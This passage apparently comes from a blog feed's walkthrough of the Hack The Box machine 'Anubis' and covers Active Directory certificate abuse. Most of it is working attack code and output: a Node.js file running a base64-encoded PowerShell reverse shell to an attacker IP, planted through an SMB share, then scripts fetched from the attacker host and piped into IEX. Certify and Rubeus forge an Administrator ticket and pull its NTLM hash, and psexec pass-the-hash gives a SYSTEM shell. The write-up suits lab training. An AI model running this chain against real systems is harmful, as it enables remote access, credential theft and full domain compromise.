  .                                   D        0  Tue Apr 27 14:40:20 2021
  ..                                  D        0  Tue Apr 27 14:40:20 2021
  Big 5.omv                           A     6455  Tue Apr 27 14:39:20 2021
  Bugs.omv                            A     2897  Tue Apr 27 14:39:55 2021
  Tooth Growth.omv                    A     2142  Tue Apr 27 14:40:20 2021
  Whatif.omv                          A     2841  Sat Jan 29 23:41:40 2022

                9034239 blocks of size 4096. 2998668 blocks available
smb: \Documents\Analytics\&gt; get Whatif.omv 
getting file \Documents\Analytics\Whatif.omv of size 2841 as Whatif.omv (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
smb: \Documents\Analytics\&gt; </span></code></pre></figure>

<figure>
<img src="/assets/img/anubis/meta.png" alt="metdata" />
<figcaption> XSS </figcaption>
</figure>

<p>zexion.js,</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% <span class="nb">cat </span>zexion.js 
const <span class="nb">exec</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.exec<span class="p">;</span>  
<span class="nb">exec</span><span class="o">(</span><span class="s1">'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA0ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA='</span><span class="o">)</span><span class="p">;</span>
% smbclient <span class="se">\\\\</span>10.10.11.102<span class="se">\\</span>Shared <span class="nt">-U</span> localadmin
Enter WORKGROUP<span class="se">\l</span>ocaladmin<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; cd Documents\Analytics\
smb: \Documents\Analytics\&gt; ls
  .                                   D        0  Tue Apr 27 14:40:20 2021
  ..                                  D        0  Tue Apr 27 14:40:20 2021
  Big 5.omv                           A     6455  Tue Apr 27 14:39:20 2021
  Bugs.omv                            A     2897  Tue Apr 27 14:39:55 2021
  Tooth Growth.omv                    A     2142  Tue Apr 27 14:40:20 2021
  Whatif.omv                          A     2841  Sat Jan 29 23:56:41 2022

                9034239 blocks of size 4096. 2984285 blocks available
smb: \Documents\Analytics\&gt; put Whatif.omv 
putting file Whatif.omv as \Documents\Analytics\Whatif.omv (3.1 kb/s) (average 3.1 kb/s)
smb: \Documents\Analytics\&gt; put Whatif.omv 
putting file Whatif.omv as \Documents\Analytics\Whatif.omv (3.1 kb/s) (average 3.1 kb/s)
smb: \Documents\Analytics\&gt; </span></code></pre></figure>

<p>And we get a shell back as diegocruz,</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% rlwrap nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
connect to <span class="o">[</span>10.10.14.54] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.102] 59672
<span class="nb">whoami
</span>windcorp<span class="se">\d</span>iegocruz
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; </code></pre></figure>

<p>Now, we can pretty get idea from this <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noopener nofollow">blog</a> and improve some steps now. When checking the shares, we saw that Certenroll. So, we can pretty much guess the root path is ADCS Abuse. Let’s download <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Certify.exe" target="_blank" rel="noopener nofollow">Certify.exe</a>, <a href="https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1" target="_blank" rel="noopener nofollow">ADCS.ps1</a>, <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener nofollow">Powerview.ps1</a> and <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe" target="_blank" rel="noopener nofollow">Rubeus.exe</a>. But the ADCS doesn’t work because the UserPrincipalName in box is wrong. It is using .thm as its domain. So, we’ll get errored out. So, let’s just change it to be SamAccountName and then import.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; Get-ADUser diegocruz


DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Diego Cruz,OU<span class="o">=</span>MainOffice,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb
Enabled           : True
GivenName         : Diego
Name              : Diego Cruz
ObjectClass       : user
ObjectGUID        : e085c2ea-a376-42bf-8ea5-4fdd2dadc3b1
SamAccountName    : DiegoCruz
SID               : S-1-5-21-3510634497-171945951-3071966075-3245
Surname           : Cruz
UserPrincipalName : Diego.Cruz@windcorp.thm
 </code></pre></figure>

<figure>
<img src="/assets/img/anubis/fix.png" alt="Fixed" />
<figcaption> Quick Fix </figcaption>
</figure>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; wget 10.10.14.54/ADCS.ps1 | IEX

&lt;<span class="c">#</span>
.SYNOPSIS

Just a shortcut to PowerViews Get-DomainObject that retrieves Root CAs from the default location at <span class="nv">CN</span><span class="o">=</span>Certification
Authorities,CN<span class="o">=</span>Public Key Services,CN<span class="o">=</span>Services,CN<span class="o">=</span>Configuration....

Author: Christoph Falta <span class="o">(</span>@cfalta<span class="o">)</span>

.LINK

https://github.com/cfalta/PoshADCS

<span class="c">#&gt;</span>
    <span class="nv">$DomainName</span> <span class="o">=</span> <span class="s2">"DC="</span> + <span class="o">(((</span>Get-Domain<span class="o">)</span>.Name<span class="o">)</span>.Replace<span class="o">(</span><span class="s2">"."</span>,<span class="s2">",DC="</span><span class="o">))</span>
    <span class="nv">$BasePath</span> <span class="o">=</span> <span class="s2">"CN=Public Key Services,CN=Services,CN=Configuration"</span> + <span class="s2">","</span> + <span class="nv">$DomainName</span>
    <span class="nv">$RootCA</span> <span class="o">=</span>  Get-DomainObject <span class="nt">-SearchBase</span> <span class="o">(</span><span class="s2">"CN=Certification Authorities,"</span> + <span class="nv">$BasePath</span><span class="o">)</span> <span class="nt">-LDAPFilter</span>
<span class="s2">"(objectclass=certificationAuthority)"</span>
    <span class="nv">$RootCA</span>

PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; wget 10.10.14.54/PowerView.ps1 | IEX
PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; wget 10.10.14.54/Certify.exe <span class="nt">-O</span> Certify.exe
PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; wget 10.10.14.54/Rubeus.exe <span class="nt">-O</span> Rubeus.exe
PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt;</code></pre></figure>

<p>We find the template name as Web with Certify,</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; .<span class="se">\C</span>ertify.exe find
.<span class="se">\C</span>ertify.exe find /authclient

   _____          _   _  __
  / ____|        | | <span class="o">(</span>_<span class="o">)</span>/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ <span class="se">\ </span><span class="s1">'__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base '</span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb<span class="s1">'

[*] Listing info about the Enterprise CA '</span>windcorp-CA<span class="s1">'

    Enterprise CA Name            : windcorp-CA
    DNS Hostname                  : earth.windcorp.htb
    FullName                      : earth.windcorp.htb\windcorp-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=windcorp-CA, DC=windcorp, DC=htb
    Cert Thumbprint               : 280458EB20AE6B8A8FFE9B428A5078094F91B3E8
    Cert Serial                   : 3645930A75C5C8BA4AAC0A5C883DEE60
    Cert Start Date               : 5/24/2021 7:48:07 PM
    Cert End Date                 : 5/24/2036 7:58:07 PM
    Cert Chain                    : CN=windcorp-CA,DC=windcorp,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
[---------- SNIP ----------]
    CA Name                               : earth.windcorp.htb\windcorp-CA
    Template Name                         : Web
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : Server Authentication
    Permissions
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290



Certify completed in 00:00:13.6025779
PS C:\users\diegocruz\desktop&gt;</span></code></pre></figure>

<p>And we get NTLM Hash of Administrator,</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; Get-SmartCardCertificate <span class="nt">-Identity</span> Administrator <span class="nt">-TemplateName</span> Web <span class="nt">-NoSmartCard</span>
PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; Get-ChildItem cert:<span class="se">\c</span>urrentuser<span class="se">\m</span>y <span class="nt">-recurse</span>


   PSParentPath: Microsoft.PowerShell.Security<span class="se">\C</span>ertificate::currentuser<span class="se">\m</span>y

Thumbprint                                Subject
<span class="nt">----------</span>                                <span class="nt">-------</span>
D88FCB374AAB94FE2C23DDAC11ECA01D704C755E


PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt; .<span class="se">\R</span>ubeus.exe asktgt /user:Administrator /getcredentials /certificate:D88FCB374AAB94FE2C23DDAC11ECA01D704C755E

   ______        _
  <span class="o">(</span>_____ <span class="se">\ </span>     | |
   _____<span class="o">)</span> <span class="o">)</span>_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ <span class="se">\|</span> ___ | | | |/___<span class="o">)</span>
  | |  <span class="se">\ \|</span> |_| | |_<span class="o">)</span> <span class="o">)</span> ____| |_| |___ |
  |_|   |_|____/|____/|_____<span class="o">)</span>____/<span class="o">(</span>___/

  v2.0.0

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Ask TGT

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using PKINIT with etype rc4_hmac and subject:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building AS-REQ <span class="o">(</span>w/ PKINIT preauth<span class="o">)</span> <span class="k">for</span>: <span class="s1">'windcorp.htb\Administrator'</span>
<span class="o">[</span>+] TGT request successful!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">base64</span><span class="o">(</span>ticket.kirbi<span class="o">)</span>:

      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
      <span class="nv">MzYxN1qoDhsMV0lORENPUlAuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0Gwx3aW5kY29ycC5odGI</span><span class="o">=</span>

  ServiceName              :  krbtgt/windcorp.htb
  ServiceRealm             :  WINDCORP.HTB
  UserName                 :  Administrator
  UserRealm                :  WINDCORP.HTB
  StartTime                :  1/30/2022 6:36:17 AM
  EndTime                  :  1/30/2022 4:36:17 PM
  RenewTill                :  2/6/2022 6:36:17 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64<span class="o">(</span>key<span class="o">)</span>              :  h8lT6mm+8biEseKQnvfSWg<span class="o">==</span>
  ASREP <span class="o">(</span>key<span class="o">)</span>              :  F46E003D8C09E9ECF26C3AC295346D9D

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 3CCC18280610C6CA3156F995B5899E09
PS C:<span class="se">\u</span>sers<span class="se">\d</span>iegocruz<span class="se">\d</span>esktop&gt;</code></pre></figure>

<p>And we finally have a shell as Administrator with intended path,</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">psexec.py administrator@10.10.11.102 <span class="nt">-hashes</span> 3CCC18280610C6CA3156F995B5899E09:3CCC18280610C6CA3156F995B5899E09
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.11.102.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file floFnERu.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.11.102.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service Yrwk on 10.10.11.102.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service Yrwk.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2114]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cat</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
<span class="s1">'cat'</span> is not recognized as an internal or external <span class="nb">command</span>,
operable program or batch file.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
9851b59ec4a8a85d93a15d3a07732978

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; </code></pre></figure>]]></content><author><name>zexionx00</name><email>zexionx00@gmail.com</email></author><category term="HTB" /><summary type="html"><![CDATA[A Insane rated machine from Hack The Box]]></summary></entry></feed>